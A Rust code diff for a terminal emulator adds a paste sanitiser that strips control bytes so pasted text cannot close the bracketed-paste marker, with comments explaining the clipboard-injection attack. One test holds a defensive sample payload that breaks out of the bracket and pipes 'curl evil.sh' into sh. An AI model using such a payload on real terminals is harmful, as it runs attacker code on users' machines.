@@ -680,16 +680,17 @@ impl TerminalCore {
                     return Ok(false);
                 }
                 // Build the paste straight into the reused key buffer: bracketed-paste
-                // markers when the program enabled them (`?2004`), and the text with
-                // every line ending folded to a single CR. A pasted newline arrives as
-                // CR, so a bare LF becomes CR and a CRLF collapses to one CR (swallowing
-                // the LF) rather than doubling. Snaps the view to the bottom, like input.
+                // markers when the program enabled them (`?2004`), and the text folded
+                // and filtered by `sanitize_paste`. The filter runs whether or not the
+                // brackets do — a control character is no more welcome in a raw paste —
+                // and it is what keeps the payload from closing the bracket we just
+                // opened. Snaps the view to the bottom, like input.
                 let bracketed = self.screen.bracketed_paste();
                 self.key_buf.clear();
                 if bracketed {
                     self.key_buf.extend_from_slice(b"\x1b[200~");
                 }
-                fold_paste_newlines(&mut self.key_buf, &text);
+                sanitize_paste(&mut self.key_buf, &text);
                 if bracketed {
                     self.key_buf.extend_from_slice(b"\x1b[201~");
                 }
@@ -1692,12 +1693,34 @@ fn enqueue(out: &mut Vec<u8>, head: usize, bytes: &[u8]) {
     out.extend_from_slice(&bytes[..bytes.len().min(room)]);
 }
 
-/// Append `text` to `out` with every line ending folded to a single carriage
-/// return: a pasted newline reaches the child as CR, so a bare LF becomes CR and a
-/// CRLF collapses to one CR (its LF swallowed) rather than arriving doubled; a lone
-/// CR stays one CR. One pass straight into the caller's reused buffer, no
-/// intermediate `String`.
-fn fold_paste_newlines(out: &mut Vec<u8>, text: &str) {
+/// Append `text` to `out` as the bytes a paste is allowed to deliver: printable text,
+/// with every line ending folded to a single carriage return and every control
+/// character dropped.
+///
+/// **Folding.** A pasted newline reaches the child as CR, so a bare LF becomes CR and a
+/// CRLF collapses to one CR (its LF swallowed) rather than arriving doubled; a lone CR
+/// stays one CR.
+///
+/// **Filtering.** Everything else in C0, plus DEL and the whole C1 block, is dropped.
+/// Tab is the one control that survives, because it is text people paste on purpose.
+///
+/// The filter is a security boundary, not tidiness. Pasted bytes are attacker-reachable
+/// without any clipboard cooperation: OSC 52 *writes* are accepted, so `cat`ing a
+/// hostile file, or a log line or compiler error quoting attacker text, can plant a
+/// payload in the real clipboard that the user's own Ctrl+Shift+V then detonates. An
+/// `ESC` surviving into a bracketed paste lets the payload close the `\x1b[201~` bracket
+/// this terminal opened: readline takes the following CR as a real Enter, runs what came
+/// before it, and treats the rest as ordinary keystrokes. One pasted line, two executed
+/// commands, and the second never shown as pasted text. xterm ships the same defence as
+/// `disallowedPasteControls`; foot strips C0 other than tab, CR and LF, which is what
+/// this does.
+///
+/// Note what this cannot cover: with `?2004` off there are no brackets to break out of,
+/// so an embedded CR still submits its line. xterm behaves the same way, and it is the
+/// reason bracketed paste exists.
+///
+/// One pass straight into the caller's reused buffer, no intermediate `String`.
+fn sanitize_paste(out: &mut Vec<u8>, text: &str) {
     let bytes = text.as_bytes();
     let mut i = 0;
     while i < bytes.len() {
@@ -1709,6 +1732,14 @@ fn fold_paste_newlines(out: &mut Vec<u8>, text: &str) {
                 }
             }
             b'\n' => out.push(b'\r'),
+            b'\t' => out.push(b'\t'),
+            // The rest of C0, and DEL. ESC is the dangerous one (it closes the paste
+            // bracket); NUL, BS and DEL are xterm's other defaults and edit the line.
+            0x00..=0x1f | 0x7f => {}
+            // The C1 block, which arrives here as its two-byte UTF-8 encoding because
+            // the caller has already lossily decoded the clipboard's bytes. A raw 0x9b
+            // is the single-byte CSI, so it closes a bracket exactly as ESC `[` does.
+            0xc2 if bytes.get(i + 1).is_some_and(|b| (0x80..=0x9f).contains(b)) => i += 1,
             b => out.push(b),
         }
         i += 1;
@@ -1803,15 +1834,15 @@ mod tests {
     fn paste_folds_every_newline_shape_to_one_cr() {
         let mut out = Vec::new();
         // CRLF, bare LF, and lone CR all become a single CR; other bytes pass through.
-        fold_paste_newlines(&mut out, "a\r\nb\nc\rd");
+        sanitize_paste(&mut out, "a\r\nb\nc\rd");
         assert_eq!(out, b"a\rb\rc\rd");
         // A trailing CRLF collapses to one CR (its LF swallowed), not two.
         out.clear();
-        fold_paste_newlines(&mut out, "line\r\n");
+        sanitize_paste(&mut out, "line\r\n");
         assert_eq!(out, b"line\r");
         // Multibyte UTF-8 is copied verbatim.
         out.clear();
-        fold_paste_newlines(&mut out, "héllo 日本");
+        sanitize_paste(&mut out, "héllo 日本");
         assert_eq!(out, "héllo 日本".as_bytes());
     }
 
@@ -1889,6 +1920,60 @@ mod tests {
         enqueue(&mut out, OUT_QUEUE_MAX, b"dddd");
         assert_eq!(out.len(), OUT_QUEUE_MAX + 4);
         assert_eq!(&out[OUT_QUEUE_MAX..], b"dddd");
+    }
+
+    #[test]
+    fn a_paste_cannot_close_the_bracket_the_terminal_opened() {
+        // The attack, end to end through the real writer. The payload carries its own
+        // `\x1b[201~`; if it survives, readline sees the paste end early, takes the
+        // following CR as a real Enter and runs `echo hi`, then receives the rest as
+        // ordinary typing and the next CR executes *that*. One pasted line, two commands,
+        // and the second never displayed as pasted text.
+        let mut core = TerminalCore::new(true, 80, 24, METRICS, 640, 384, 0);
+        core.feed_test_bytes(b"\x1b[?2004h"); // the program wants bracketed paste
+        let payload = "echo hi\x1b[201~\ncurl evil.sh|sh\n";
+        core.apply(ToTerminal::Paste(payload.as_bytes().to_vec()))
+            .expect("paste");
+
+        let sent = core.key_buf.clone();
+        assert_eq!(
+            sent.windows(6).filter(|w| *w == b"\x1b[201~").count(),
+            1,
+            "exactly one paste-end marker, the one we wrote: {:?}",
+            String::from_utf8_lossy(&sent)
+        );
+        // Only the ESC is removed; `[201~` stays as the printable text it now is. That
+        // is deliberate, and what xterm and foot do: the paste is inert either way, and
+        // silently swallowing the rest of the sequence would hide characters the user
+        // really did paste.
+        assert_eq!(
+            sent,
+            b"\x1b[200~echo hi[201~\rcurl evil.sh|sh\r\x1b[201~".to_vec(),
+            "the ESC is dropped and the text arrives as one inert paste"
+        );
+    }
+
+    #[test]
+    fn a_paste_delivers_text_and_tabs_but_no_other_control_bytes() {
+        let mut out = Vec::new();
+        // NUL, BS, ESC and DEL are xterm's `disallowedPasteControls`; all of C0 goes
+        // except the two line endings (folded above) and tab, which is real text.
+        sanitize_paste(&mut out, "a\0b\x08c\x1bd\x7fe\x07f");
+        assert_eq!(out, b"abcdef");
+        out.clear();
+        sanitize_paste(&mut out, "col1\tcol2");
+        assert_eq!(out, b"col1\tcol2", "tab is text people paste on purpose");
+
+        // The C1 block reaches here as two-byte UTF-8, since the clipboard's bytes are
+        // lossily decoded before this. U+009B is the single-byte CSI: left in, it opens
+        // a control sequence with no ESC in sight.
+        out.clear();
+        sanitize_paste(&mut out, "a\u{9b}201~b\u{85}c");
+        assert_eq!(out, b"a201~bc");
+        // A 0xc2 that is *not* leading a C1 is an ordinary Latin-1 character and stays.
+        out.clear();
+        sanitize_paste(&mut out, "café ©");
+        assert_eq!(out, "café ©".as_bytes());
     }
 
     #[test]
